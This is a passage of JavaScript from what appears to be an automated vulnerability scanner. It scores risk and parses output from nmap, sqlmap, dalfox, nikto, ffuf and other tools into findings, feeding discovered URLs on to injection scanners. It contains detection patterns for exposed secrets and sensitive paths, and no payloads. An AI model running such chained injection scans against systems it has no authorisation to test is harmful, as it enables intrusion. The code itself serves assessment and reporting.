      this.log(scanId, 'warn', `Promotion after capture failed: ${e.message}`)
      return false
    }
  }
}

export function computeRiskScore(counts, maxCvss = null) {
  const c = counts || {}
  const crit = Number(c.critical) || 0
  const high = Number(c.high) || 0
  const med = Number(c.medium) || 0
  const low = Number(c.low) || 0

  // A CVSS v4.0 base score is a per-vulnerability metric — it is NOT additive.
  // Adding a prevalence "residual" on top of it produced aggregate scores that
  // outranked their own worst finding (249 findings whose worst issue was 9.3
  // were reported as 10.0/10, i.e. worse than any actual vulnerability found).
  // When a real CVSS score exists it is the authoritative headline; prevalence
  // is reported separately as finding counts, never folded into the score.
  if (maxCvss != null && Number(maxCvss) > 0) {
    return Math.min(10.0, Math.round(Number(maxCvss) * 10) / 10)
  }

  let base = 0.0
  if (crit > 0) {
    base = 9.0
  } else if (high > 0) {
    base = 7.0
  } else if (med > 0) {
    base = 4.0
  } else if (low > 0) {
    base = 1.0
  } else {
    return 0.0
  }

  let residual = 0.0
  if (crit > 0) {
    residual = Math.min(1.0, (crit - 1) * 0.2 + high * 0.05 + med * 0.02)
  } else if (high > 0) {
    residual = Math.min(1.9, (high - 1) * 0.2 + med * 0.05 + low * 0.02)
  } else if (med > 0) {
    residual = Math.min(2.9, (med - 1) * 0.15 + low * 0.03)
  } else if (low > 0) {
    residual = Math.min(2.9, (low - 1) * 0.1)
  }

  return Math.min(10.0, Math.round((base + residual) * 10) / 10)
}

/**
 * Single source of truth for the qualitative risk rating. Derived from the
 * SAME weighted score as computeRiskScore() so the report cover and the
 * appendix can NEVER disagree (bug: cover said "MEDIUM" while appendix
 * said "Risk Score 10.0/10" — two independent scoring paths).
 */
export function riskRatingFromScore(score) {
  const s = Number(score) || 0
  if (s >= 9.0) return 'CRITICAL'
  if (s >= 7.0) return 'HIGH'
  if (s >= 4.0) return 'MEDIUM'
  if (s > 0) return 'LOW'
  return 'INFORMATIONAL'
}

function cleanText(txt) {
  if (!txt) return ''
  return String(txt)
    .replace(/\x1B\[[0-9;]*[a-zA-Z]/g, '')
    .replace(/\r/g, '')
    .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F\u00A0]/g, ' ')
}

/** Heuristic extraction of findings from raw tool output. Grounded, no hallucination. */
/**
 * Parse a native tool's stdout/stderr into findings.
 *
 * Exported because the catch-all suppression for `ffuf`/`gobuster` lives here:
 * a wordlist hit on a server that 200s every path is not a discovery, and that
 * rule is only trustworthy if it can be exercised directly.
 *
 * @param {string} tool          native tool name
 * @param {string} output        combined stdout+stderr
 * @param {string} target        scan target (used to build chaining URLs)
 * @param {object|null} baseline catch-all baseline from `detectCatchAllBaseline`
 */
export function extractFindingsFromOutput(tool, output, target = '', baseline = null) {
  const findings = []
  const cleanOutput = cleanText(output)
  const lines = cleanOutput.split('\n')
  const discoveredUrls = [] // collected for chaining into dalfox/sqlmap
  const push = (title, severity, evidence, extra = {}) => findings.push({
    title: cleanText(title).replace(/\s+/g, ' ').trim().slice(0, 160), severity, description: cleanText(evidence).slice(0, 400),
    ...extra,
    evidence: { tool, raw: cleanText(evidence).slice(0, 800), ...(extra.evidence || {}) },
  })

  // ── nmap: open ports + service versions + script findings ──
  if (tool === 'nmap') {
    const portRe = /^(\d+)\/(tcp|udp)\s+(\S+)\s+(\S+)\s*(.*)$/
    const risky = { 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 445: 'SMB', 3389: 'RDP', 3306: 'MySQL', 5432: 'PostgreSQL', 6379: 'Redis', 27017: 'MongoDB', 9200: 'Elasticsearch', 1433: 'MSSQL', 5900: 'VNC', 11211: 'Memcached' }
    for (const line of lines) {
      const cleanLine = line.trim()
      const m = cleanLine.match(portRe)
      if (m && m[3] === 'open') {
        const port = parseInt(m[1])
        const svc = m[4]
        const ver = m[5]?.trim() || ''
        const isRisky = risky[port]
        push(
          `Open port ${port}/${m[2]} (${svc}${ver ? ` — ${ver}` : ''})${isRisky ? ` [${isRisky}]` : ''}`,
          isRisky ? 'medium' : 'info',
          cleanLine,
          { port, service: svc }
        )
      }
      // nmap NSE script findings (e.g. "| ssl-heartbleed: VULNERABLE" or "| vulners: CVE-2023-38408 7.5")
      // Skip future-date CVEs (CVE-2026+) and negative results
      if (/^\|.*(vulnerab|CVE-|backdoor|anonymous|weak)/i.test(cleanLine)) {
        const cveMatch = cleanLine.match(/(CVE-(\d{4})-\d+)/i)
        // Skip future-year CVEs (CVE-2026 and beyond) — these are hallucinations
        if (cveMatch && parseInt(cveMatch[2]) > new Date().getUTCFullYear()) continue
        // Skip negative/not-found messages
        if (/not vulnerable|not found|no (vulnerab|backdoor|issue)|couldn'?t find|state: /i.test(cleanLine)) continue
        const cvssMatch = cleanLine.match(/\b(\d+\.\d+)\b/)
        const cvss = cvssMatch ? parseFloat(cvssMatch[1]) : 0
        // Severity based on CVSS score, not blindly "high" — version-only matches are weak
        const sev = cvss >= 9.0 ? 'critical' : cvss >= 7.0 ? 'high' : cvss >= 4.0 ? 'medium' : 'low'
        const title = cveMatch
          ? `nmap vulners: ${cveMatch[1].toUpperCase()}${cvssMatch ? ` (CVSS ${cvssMatch[1]})` : ''}`
          : `nmap script: ${cleanLine.replace(/^[|\s#]+/, '').replace(/http\S+/gi, '').slice(0, 90)}`
        push(title, sev, cleanLine, { cveId: cveMatch ? cveMatch[1].toUpperCase() : null })
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── wpscan JSON: WordPress vulns (authoritative) ──
  if (tool === 'wpscan') {
    try {
      const start = output.indexOf('{')
      if (start >= 0) {
        const j = JSON.parse(output.slice(start))
        const interesting = j.interesting_findings || []
        for (const f of interesting.slice(0, 10)) {
          // `to_s` is wpscan's own display prose. A JSON blob describes the probe, not
          // the target, so it must never become the description (same rule as nuclei above).
          const prose = typeof f.to_s === 'string' ? cleanText(f.to_s).replace(/\s+/g, ' ').trim() : ''
          const label = prose || String(f.type || 'finding').replace(/[_-]+/g, ' ')
          push(`wpscan: ${label}`, 'low', prose || JSON.stringify(f).slice(0, 300), { description: label.slice(0, 400) })
        }
        const vulns = [
          ...(j.version?.vulnerabilities || []),
          ...Object.values(j.plugins || {}).flatMap(p => p.vulnerabilities || []),
          ...Object.values(j.themes || {}).flatMap(t => t.vulnerabilities || []),
        ]
        for (const v of vulns.slice(0, 20)) {
          push(
            `WordPress vuln: ${v.title}`,
            /rce|sqli|sql injection|auth bypass/i.test(v.title) ? 'high' : 'medium',
            `${v.title} — refs: ${(v.references?.cve || []).join(', ') || 'none'}`,
            { cveId: v.references?.cve?.[0] ? `CVE-${v.references.cve[0]}` : null }
          )
        }
        if (j.users) for (const u of Object.keys(j.users).slice(0, 5)) {
          push(`WordPress user enumeration: ${u}`, 'low', `Enumerated WP username "${u}"`)
        }
      }
    } catch { /* not json, fall through */ }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── katana JSONL: crawl URLs → feed dalfox/sqlmap ──
  if (tool === 'katana') {
    for (const line of lines) {
      if (!line.trim().startsWith('{')) continue
      try {
        const j = JSON.parse(line)
        const url = j.request?.endpoint || j.endpoint || j.url
        if (url) {
          discoveredUrls.push(url)
          // URLs with params are injection candidates
          if (/\?[^=]+=/.test(url)) {
            push(`katana: Parameterized endpoint ${url.slice(0, 120)}`, 'info', url, { url })
          }
          // Sensitive paths
          if (/admin|backup|config|\.git|\.env|upload|debug|phpinfo|console|actuator|swagger|api-doc/i.test(url)) {
            push(`katana: Sensitive path discovered — ${url.slice(0, 120)}`, 'medium', url, { url })
          }
        }
      } catch { /* skip */ }
    }
    if (findings.length || discoveredUrls.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── dalfox: confirmed XSS (JSON array) ──
  if (tool === 'dalfox') {
    // dalfox --format json outputs a JSON array of results
    try {
      const start = output.indexOf('[')
      if (start >= 0) {
        const arr = JSON.parse(output.slice(start))
        for (const r of arr.slice(0, 20)) {
          const xssType = String(r.type || r.inject_type || 'reflected').toLowerCase()
          const xssParam = r.param || r.parameter || ''
          const xssWhere = r.data || r.url || r.evidence || target || ''
          const where = String(xssWhere).slice(0, 100)
          // Only include clauses we actually resolved — no "unknown parameter" / trailing dashes.
          const title = [
            `XSS (${xssType})`,
            xssParam ? `in parameter "${xssParam}"` : 'on ' + (where || 'target'),
            !xssParam && where ? '' : (where ? `— ${where}` : '')
          ].filter(Boolean).join(' ').replace(/\s+/g, ' ').trim()
          const detail = xssParam
            ? `${xssType} XSS via parameter "${xssParam}" at ${where || 'target'}`
            : `${xssType} XSS confirmed on ${where || 'target'}`
          push(
            title,
            /stored/i.test(xssType) ? 'high' : 'medium',
            `${detail} — payload: ${String(r.poc || r.payload || (r.evidence ? '' : 'see tool output')).slice(0, 200)}`.replace(/ — payload: $/, '').slice(0, 300),
            { cweId: 'CWE-79', url: xssWhere }
          )
        }
      }
    } catch { /* fall through to text mode */ }
    if (!findings.length) {
      for (const line of lines) {
            // Require dalfox's explicit finding markers [POC] or [V] to avoid
            // catching banner/status lines that mention "vulnerable" or "xss".
            if (/\[POC\]|\[V\]/i.test(line) && /param|xss|inject/i.test(line) && !/not vulnerable|no (?:vulnerab|result|parameter)|couldn'?t find/i.test(line)) {
              push(`dalfox: ${line.trim().slice(0, 140)}`, 'medium', line.trim(), { cweId: 'CWE-79' })
            }
          }
        }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── sqlmap: confirmed injection ──
  if (tool === 'sqlmap') {
    // Only match positive confirmation — skip "not injectable", "do not appear to be injectable"
    const injectable = /(parameter '(.+)' is vulnerable|is vulnerable to|(?<!\bnot )injectable|(?<!\bnot appear to be )injectable)/i
    for (let i = 0; i < lines.length; i++) {
      // Skip lines that are clearly negative
      if (/not injectable|do not appear to be injectable|no parameter found|all tested parameters do not appear|back-end dbms is/i.test(lines[i])) continue
      if (injectable.test(lines[i])) {
        const ctx = lines.slice(Math.max(0, i - 2), i + 3).join('\n')
        push(
          `SQL Injection — ${lines[i].trim().slice(0, 140)}`,
          'critical',
          ctx.slice(0, 400),
          { cweId: 'CWE-89', owaspCategory: 'A05:2025-Injection' }
        )
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── whatweb: technology fingerprinting (text mode) ──
  // Format: https://host [200 OK] Title=[...], HTTPServer[nginx], PHP[7.4.33], WordPress[6.0]
  // NOTE: whatweb emits `Key[value]` with NO `=` separator (aggressive mode adds some with `=`).
  if (tool === 'whatweb') {
    for (const line of lines) {
      const m = line.match(/^(https?:\/\/\S+)\s*\[(\d{3})[^\]]*\]\s*(.*)$/i)
      if (!m) continue
      const [, url, , rest] = m
      const server = rest.match(/HTTPServer=?\[([^\]]*)\]/i)?.[1]
      const techs = [...rest.matchAll(/\b([A-Za-z][A-Za-z0-9_-]{1,30})=?\[([^\]]*)\]/g)]
        .map((x) => (x[2] ? `${x[1]} ${x[2]}` : x[1]))
        .filter((t) => !/^(IP|Country|Title|HTTPServer)\b/i.test(t))
      const stack = [server, ...techs].filter(Boolean)
      if (stack.length) {
        push(`Technology Stack Detected (${stack.length} ${stack.length === 1 ? 'technology' : 'technologies'})`, 'info', line, { url })
      }

        // ── VERSION UNVERIFIED DETECTION ──
        // When a product is detected but its version is empty/obscured (often due
        // to Cloudflare/WAF masking), flag it so the report can show "version
        // unverified" instead of silently dropping or guessing.
        const wafDetected = /Cloudflare|Incapsula|Sucuri|Imperva|Akamai|Fastly/i.test(rest)
        const productMatches = [...rest.matchAll(/\b([A-Za-z][A-Za-z0-9_-]{1,30})\[([^\]]*)\]/g)]
        // Edge/WAF products are collapsed into a single infrastructure card —
        // per-product rows here duplicated the version-audit inventory finding.
        const edgeVendors = []
        for (const pm of productMatches) {
          const product = pm[1]
          const version = (pm[2] || '').trim()
          if (/^(IP|Country|Title|HTTPServer|Email|Script|Open-Graph-Protocol|X-Frame-Options|Content-Security-Policy|Strict-Transport-Security|X-XSS-Protection)\b/i.test(product)) continue
          if (version) continue // version present — verified
          if (/^(cloudflare|incapsula|sucuri|imperva|akamai|fastly|cloudfront|akamaighost|azurefrontdoor|cloudflare-nginx)$/i.test(product)) {
            if (!edgeVendors.some(v => v.toLowerCase() === product.toLowerCase())) edgeVendors.push(product)
            continue
          }
          // Product detected but version obscured
          push(`whatweb: ${product} detected but version obscured${wafDetected ? ' (behind WAF/CDN)' : ''}`, 'info', line, {
            url,
            version_unverified: true,
            product,
            wafDetected,
          })
        }
        if (edgeVendors.length) {
          push(
            `Edge security / CDN infrastructure detected: ${edgeVendors.join(', ')}`,
            'info',
            `whatweb observed an edge security layer: ${edgeVendors.join(', ')}. Consolidated as infrastructure context; the edge obscures origin versions but does not remove origin vulnerability.`,
            {
              module: 'version-audit',
              cweId: 'CWE-200',
              owaspCategory: 'A02:2025-Security Misconfiguration',
              severityFloor: 'info',
              url,
              evidence: { edgeProducts: edgeVendors.join(', '), kind: 'edge-inventory', detectionSource: 'whatweb', count: edgeVendors.length },
            },
          )
        }
      }
      if (findings.length) return { findings: findings.slice(0, 10), discoveredUrls }
  }

  // ── subfinder / amass / dnsbrute: one subdomain per line ──
  if (tool === 'subfinder' || tool === 'amass' || tool === 'dnsbrute') {
    const seen = new Set()
    for (const line of lines) {
      const m = line.match(/([a-z0-9.-]+\.[a-z]{2,})/i)
      if (!m) continue
      const h = m[1].toLowerCase()
      if (seen.has(h)) continue
      seen.add(h)
      push(`Subdomain: ${h}`, 'info', h, { url: `https://${h}` })
    }
    if (findings.length) return { findings: findings.slice(0, 50), discoveredUrls }
  }

  // ── httpx: HTTP probe results (ProjectDiscovery JSONL or plain status lines) ──
  if (tool === 'httpx') {
    let probed = 0
    for (const line of lines) {
      const t = line.trim()
      if (!t) continue
      // ProjectDiscovery JSON mode
      if (t.startsWith('{')) {
        try {
          const j = JSON.parse(t)
          const u = j.url || j.input || j.host
          const sc = j.status_code || j.statusCode || j['status-code']
          const title = j.title || ''
          const tech = (j.tech || j.technologies || []).join(', ')
          if (u) {
            push(`httpx: ${u} → HTTP ${sc || '?'}${title ? ` — ${title}` : ''}${tech ? ` [${tech}]` : ''}`.slice(0, 150), 'info', t.slice(0, 300), { url: u })
            if (u) discoveredUrls.push(u)
            probed++
          }
        } catch { /* not json */ }
        continue
      }
      // Python httpx / plain mode: "HTTP/1.1 200 OK" or status line
      const m = t.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/i) || t.match(/\b(\d{3})\b.*?(OK|Found|Moved|Forbidden|Unauthorized)/i)
      if (m && probed === 0) {
        push(`httpx: target responded HTTP ${m[1]}`, 'info', t.slice(0, 300))
        probed++
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── arjun: discovered hidden parameters ──
  if (tool === 'arjun') {
    for (const line of lines) {
      const t = line.trim()
      // arjun output: "[✓] Parameters found:", "[+] Parameters found:", "GET param:", "POST param:"
      if (/parameters?\s*found|param.*found|GET:|POST:|reflect/i.test(t) && !/testing|probing|scanning|starting|no parameter|not reflect/i.test(t)) {
        push(`arjun: ${t.slice(0, 140)}`, 'low', t)
        // Extract URLs for chaining
        const urlMatch = t.match(/https?:\/\/\S+/i)
        if (urlMatch) discoveredUrls.push(urlMatch[0])
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // Lines that are tool chatter, NOT vulnerabilities — never extract from these.
  const CHATTER = /^\[(info|warning|critical)\]\s+(testing|starting|checking|fetching|resuming|heuristic|no parameter|all tested|connection to|target url|using|loaded|parsed|there were|it is recommended|do you want|please wait|initializing|scanning|enumerating|waiting|the back-end|got a |redirecting to)/i
  // A line must carry a real signal to be considered evidence.
  const SIGNAL = /(vulnerab|CVE-\d{4}-\d+|matched|found \d|identified|confirmed|injectable|exposed|detected|Template:|template-id|\[critical\]|\[high\]|\[medium\]|\[low\]|OSVDB|\+ |discovered|missing|uncommon|leak|obsolete|deprecat|outdated|default config|enabled|directory listing|cookie|header|alias|redirect|banner|server:|x-powered|debug)/i

  // Nuclei JSONL first (authoritative) — also collect URLs with params for chaining
  for (const line of lines) {
    if (line.trim().startsWith('{') && /"severity"/.test(line)) {
      try {
        const j = JSON.parse(line)
        // The nuclei CLI prints the template's own `info.description`. Carry it as
        // the finding's description so the stored prose describes the target; the
        // wrapper itself stays in `evidence.raw`, where it belongs as raw output.
        // `push()` clips any string it is handed as `evidence`, so without this the
        // 400-char description became a mid-JSON truncation of `line`.
        const prose = typeof j.info?.description === 'string'
          ? cleanText(j.info.description).replace(/\s+/g, ' ').trim().slice(0, 400)
          : ''
        push(j.info?.name || j.templateID || 'nuclei finding', (j.info?.severity || 'info').toLowerCase(), line, {
          ...(prose ? { description: prose } : {}),
          cveId: j.info?.classification?.['cve-id']?.[0] || null,
          cweId: j.info?.classification?.['cwe-id']?.[0] || null,
        })
        if (j.matchedAt || j['matched-at']) discoveredUrls.push(j.matchedAt || j['matched-at'])
        if (j.host) discoveredUrls.push(j.host)
      } catch { /* skip */ }
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // Skip lines that are clearly negative results (not vulnerable, couldn't find, etc.)
  // Defined here so both severity-tagged & keyword-heuristic sections can use it
  const NEGATIVE = /(?:not (?:vulnerable|found|injectable|exploitable|affected)|no (?:vulnerab|issue|finding|parameter|result)s?|couldn'?t find|all tested parameters do not appear|no xss|no sql|testing connection|testing if|content is stable|heuristic (?:basic )?test|banner:|id=|name=|type=|scanning|starting|finished|loaded|parsed|waiting|it is recommended|do you want|please wait|initializing|enumerating|the back-end|got a |redirecting to|target url|using |connection to|fetching|resuming)/i

  // Severity-tagged lines (nikto/nuclei text mode) — skip chatter & negative results
  for (const line of lines) {
    if (CHATTER.test(line) || NEGATIVE.test(line)) continue
    const sev = line.match(/\[(critical|high|medium|low|info)\]/i)
    if (sev && SIGNAL.test(line) && !/no parameter|testing connection|testing if|content is stable|not vulnerable|no (?:vulnerab|result|issue|finding)/i.test(line)) {
      push(`${tool}: ${line.replace(/\s+/g, ' ').slice(0, 140)}`, sev[1].toLowerCase(), line)
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // Nikto-style findings: lines starting with "+"
  // Deduplicate "Suggested security header missing" — already covered by auditHttpBaseline.
  const seenHeaders = new Set()
  for (const line of lines) {
    if (!/^\+\s+\S+/.test(line)) continue
    // SELF-ERROR FILTER: nikto's own operational errors (update check failed,
    // connection issues, timeouts) are scanner chatter, NOT target findings.
    if (/ERROR:\s*(Failed to check for updates|Could not|Unable to)|Could not connect|Connection timed? ?out|Received a redirect|Site cookie looks like a session/i.test(line)) continue
    // Skip duplicate header-missing nags
    const headerMatch = line.match(/Suggested security header missing:\s*([\w-]+)/i)
    if (headerMatch) {
      const h = headerMatch[1].toLowerCase()
      if (seenHeaders.has(h)) continue
      seenHeaders.add(h)
      // Only keep if it's NOT one of the 6 already checked by auditHttpBaseline
      const dupes = ['strict-transport-security', 'content-security-policy', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'permissions-policy']
      if (dupes.includes(h)) continue
    }
    // Broader pattern: capture any finding line (skip pure info chatter)
    if (/\/|OSVDB|CVE|vulnerab|indexing|directory|config|admin|backup|\.git|\.env|sql|xss|rfi|lfi|header|cookie|server banner|leak|expos|default|credential|password|phpinfo|shell|upload|debug|options|trace|method|rewrite|internal|error|warning|obsolete|deprecated|outdated/i.test(line)) {
      const sev = /osvdb|cve|vulnerab|\.git|\.env|sql|xss|rfi|lfi|credential|password|shell/i.test(line) ? 'medium' : 'low'
      const pathMatch = line.match(/(?:\+\s*(?:\[\d+\]\s*)?)(\/[a-zA-Z0-9_.\-\/]+)/)
      const extra = {}
      if (pathMatch && target) {
        try { extra.url = new URL(pathMatch[1], ensureScheme(target)).href } catch { /* skip */ }
      }
      push(`nikto: ${line.replace(/^\+\s*/, '').replace(/\s+/g, ' ').slice(0, 140)}`, sev, line, extra)
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // ffuf / gobuster directory fuzzing results — extract discovered paths with status codes
  const ffufPaths = []
  const dirTool = (tool === 'ffuf' || tool === 'gobuster')
  if (dirTool) {
    for (const line of lines) {
      // ffuf -s output: just the path (one per line)
      // ffuf normal output: [Status: 200, Size: 1234, ...] /path
      const ffufMatch = line.match(/^\[Status:\s*(\d+).*?(?:Size:\s*(\d+).*?)?\]\s+(\S+)/i)
      if (ffufMatch) {
        const status = ffufMatch[1]
        const size = ffufMatch[2] ? Number(ffufMatch[2]) : null
        const path = ffufMatch[3]
        if (path && path.length > 1 && !path.includes('FUZZ')) {
          ffufPaths.push({ path, status, size })
        }
        continue
      }
      // gobuster output: /path (Status: 200) [Size: 1234]
      const gobusterMatch = line.match(/^(\/\S+)\s+\(Status:\s*(\d+)\)(?:\s*\[Size:\s*(\d+))?/i)
      if (gobusterMatch) {
        const path = gobusterMatch[1]
        const status = gobusterMatch[2]
        const size = gobusterMatch[3] ? Number(gobusterMatch[3]) : null
        if (path && path.length > 1) {
          ffufPaths.push({ path, status, size })
        }
        continue
      }
      // gobuster v2 output: /path           [Status: 200, Size: 1234, Words: 456]
      // Size matters: the catch-all guard compares response length against the
      // baseline, so a directory listing recorded without its size cannot be
      // recognised as a soft-404.
      const gobusterV2 = line.match(/^(\/[^\s]+)\s+\[Status:\s*(\d+)(?:,\s*Size:\s*(\d+))?/i)
      if (gobusterV2) {
        const path = gobusterV2[1]
        const status = gobusterV2[2]
        const size = gobusterV2[3] ? Number(gobusterV2[3]) : null
        if (path && path.length > 1) {
          ffufPaths.push({ path, status, size })
        }
        continue
      }
      // ffuf -s (silent): just the path on a line by itself
      const pathMatch = line.match(/^(\/\S+)$/)
      if (pathMatch) {
        const path = pathMatch[1]
        if (path.length > 1 && !path.includes('FUZZ')) {
          ffufPaths.push({ path, status: '200' })
        }
      }
    }
  }
  if (ffufPaths.length) {
    // Soft-404 suppression at the SOURCE. A single wordlist hit on a catch-all
    // host is indistinguishable from a real one by status alone — the server
    // answers 200 with the same landing page for every path. When the caller
    // supplies the baseline, drop those hits before they are even emitted, so
    // `/ezsqliteadmin  [Status: 200, Size: 143476]` never becomes a finding.
    const baselineStatus = baseline?.isCatchAll ? String(baseline.status) : null
    const isCatchAllHit = (p) => {
      if (!baselineStatus || p.status !== baselineStatus) return false
      if (baseline.contentLength > 0 && p.size != null && p.size > 0) {
        return Math.abs(p.size - baseline.contentLength) / baseline.contentLength <= 0.02
      }
      return false
    }
    const rawCount = ffufPaths.length
    const catchAllHits = baselineStatus ? ffufPaths.filter(isCatchAllHit) : []
    const realPaths = baselineStatus ? ffufPaths.filter(p => !isCatchAllHit(p)) : ffufPaths
    if (catchAllHits.length) {
      push(`Directory enumeration contaminated by catch-all responses (${catchAllHits.length}/${rawCount} paths suppressed)`, 'info',
        `${tool} returned HTTP ${baseline.status} with ~${baseline.contentLength} bytes for ${catchAllHits.length} of ${rawCount} enumerated paths — the server answers the same page for non-existent paths${baseline.title ? ` (title "${baseline.title}")` : ''}. Those hits are not real resources and were dropped: ${catchAllHits.slice(0, 8).map(p => p.path).join(', ')}${catchAllHits.length > 8 ? '…' : ''}`)
    }
    ffufPaths.length = 0
    ffufPaths.push(...realPaths)
  }
  if (ffufPaths.length) {
    // SPA catch-all detection: if >90% of results are 200 with similar size, it's a catch-all
    // Single-page apps route all paths to index.html — every path is a false positive
    const status200Count = ffufPaths.filter(p => p.status === '200').length
    const isSpaFuzz = ffufPaths.length > 50 && status200Count / ffufPaths.length > 0.9
    if (isSpaFuzz) {
      // Still surface an informational finding about the SPA routing
      push(`${tool}: SPA catch-all routing detected (${ffufPaths.length} paths all return 200)`, 'info',
        `${tool} discovered ${ffufPaths.length} paths but all return HTTP 200 — likely SPA catch-all. Individual path findings suppressed.`)
      // Still feed discovered paths into chaining pool (base URL + path)
      const base = ensureScheme(target).replace(/\/$/, '')
      for (const p of ffufPaths.slice(0, 20)) discoveredUrls.push(`${base}${p.path.startsWith('/') ? '' : '/'}${p.path}`)
      return { findings, discoveredUrls }
    }
    // Feed ALL discovered paths into the chaining pool (base URL + path)
    const base = ensureScheme(target).replace(/\/$/, '')
    for (const p of ffufPaths) discoveredUrls.push(`${base}${p.path.startsWith('/') ? '' : '/'}${p.path}`)
    // Deliberately exclude 'sql|db' from the interesting-path regex — a path named
    // /sql or /db is NOT a SQL Injection finding and caused false positives.
    // STATUS GATE: only accessible paths (2xx/3xx/401) become findings —
    // 403/404 means the path exists but is blocked, which is NOT an exposure.
    const ACCESSIBLE = /^(200|201|204|301|302|307|308|401)$/
    const interesting = ffufPaths.filter(p => ACCESSIBLE.test(p.status) && /admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal/i.test(p.path))
    const blocked = ffufPaths.filter(p => !ACCESSIBLE.test(p.status) && /admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal/i.test(p.path))
    const others = ffufPaths.filter(p => !/admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal/i.test(p.path))
    for (const p of interesting.slice(0, 10)) {
      push(`${tool}: Discovered ${p.path} (HTTP ${p.status})`, /admin|backup|\.git|\.env|config/i.test(p.path) && p.status !== '401' ? 'medium' : 'low', `${tool} discovered ${p.path} with HTTP status ${p.status}`, {
        evidence: { status: Number(p.status), contentLength: p.size },
      })
    }
    if (blocked.length) {
      push(`${tool}: ${blocked.length} sensitive paths exist but are NOT accessible (HTTP 403/404)`, 'info',
        `Paths matching sensitive patterns returned blocking status codes: ${blocked.slice(0, 5).map(p => `${p.path} (${p.status})`).join(', ')}${blocked.length > 5 ? '...' : ''}. Access-controlled — not an exposure.`)
    }
    if (others.length) {
      push(`${tool}: ${others.length} additional paths discovered`, 'info', `Paths: ${others.slice(0, 5).map(p => p.path).join(', ')}${others.length > 5 ? '...' : ''}`)
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // wafw00f — WAF detection.
  // Emitted into the `version-audit` channel with a stable, vendor-independent
  // title so `findingFingerprint` collapses it with the whatweb and header
  // fingerprints of the same edge into ONE infrastructure-inventory finding.
  // Per-vendor `WAF Detected: <vendor>` titles produced 4 duplicate rows on a
  // single Cloudflare-fronted target.
  if (tool === 'wafw00f') {
    const vendors = []
    for (const line of lines) {
      const m = line.match(/is\s+behind\s+(.+?)(?:\s|$)/i)
      if (m) {
        const vendor = m[1].trim()
        if (vendor && !vendors.some(v => v.toLowerCase() === vendor.toLowerCase())) vendors.push(vendor)
      }
    }
    if (vendors.length) {
      push(
        `Edge security / CDN infrastructure detected: ${vendors.join(', ')}`,
        'info',
        `wafw00f identified an edge security layer: ${vendors.join(', ')}. Consolidated as infrastructure context; a WAF reduces but does not remove origin vulnerability.`,
        {
          module: 'version-audit',
          cweId: 'CWE-200',
          owaspCategory: 'A02:2025-Security Misconfiguration',
          severityFloor: 'info',
          evidence: { edgeProducts: vendors.join(', '), kind: 'edge-inventory', detectionSource: 'wafw00f', count: vendors.length },
        },
      )
      return { findings: findings.slice(0, 10), discoveredUrls }
    }
  }

  // ── feroxbuster: recursive directory brute-force ──
  // Format: `200      GET       5l      10w     100c https://host/path`
  if (tool === 'feroxbuster') {
    const paths = []
    for (const line of lines) {
      const m = line.match(/^(\d{3})\s+(?:GET|POST|HEAD)\s+\d+l\s+\d+w\s+\d+c\s+(\S+)$/i)
      if (m) paths.push({ status: m[1], url: m[2] })
    }
    if (paths.length) {
      // SPA catch-all guard (same as ffuf)
      const s200 = paths.filter(p => p.status === '200').length
      if (paths.length > 50 && s200 / paths.length > 0.9) {
        push(`feroxbuster: SPA catch-all routing detected (${paths.length} paths all return 200)`, 'info',
          `feroxbuster discovered ${paths.length} paths but all return HTTP 200 — likely SPA catch-all.`)
        for (const p of paths.slice(0, 20)) discoveredUrls.push(p.url)
        return { findings, discoveredUrls }
      }
      for (const p of paths) discoveredUrls.push(p.url)
      // STATUS GATE: only paths that actually served content (2xx/3xx) or
      // expose an auth boundary (401) become findings. 403/404/5xx paths are
      // NOT accessible — a WAF/edge block page returning 403 with a body was
      // previously ingested as "exposed .git" (10 false MEDIUMs on one scan).
      const ACCESSIBLE = /^(200|201|204|301|302|307|308|401)$/
      // STOCK FILES: publicly-shipped boilerplate — a 200 on these is normal,
      // not an exposure. Only rate above LOW if content actually contains secrets.
      const STOCK_FILE = /\/(?:\.travis\.yml|\.gitlab-ci\.yml|azure-pipelines\.yml|\.circleci\/config\.yml|package\.json|package-lock\.json|composer\.json|\.gitignore|\.gitattributes|docker-compose\.ya?ml|Gemfile|requirements\.txt|pom\.xml|Makefile|LICENSE|README(?:\.\w+)?)$/i
      const interesting = paths.filter(p => ACCESSIBLE.test(p.status) && /admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal|upload|\.sql|\.bak|\.zip/i.test(p.url))
      const blocked = paths.filter(p => !ACCESSIBLE.test(p.status) && /admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal|upload|\.sql|\.bak|\.zip/i.test(p.url))
      for (const p of interesting.slice(0, 10)) {
        const isStock = STOCK_FILE.test(p.url.replace(/^https?:\/\/[^/]+/i, ''))
        push(`feroxbuster: Discovered ${p.url.replace(/^https?:\/\/[^/]+/i, '')} (HTTP ${p.status})`,
          isStock ? 'low' : (/admin|backup|\.git|\.env|config|\.sql|\.bak/i.test(p.url) && p.status !== '401' ? 'medium' : 'low'),
          isStock
            ? `feroxbuster discovered ${p.url} with HTTP status ${p.status}. This is a commonly-public boilerplate file (CI config / package manifest) — rated LOW unless content contains secrets.`
            : `feroxbuster discovered ${p.url} with HTTP status ${p.status}`)
      }
      if (blocked.length) {
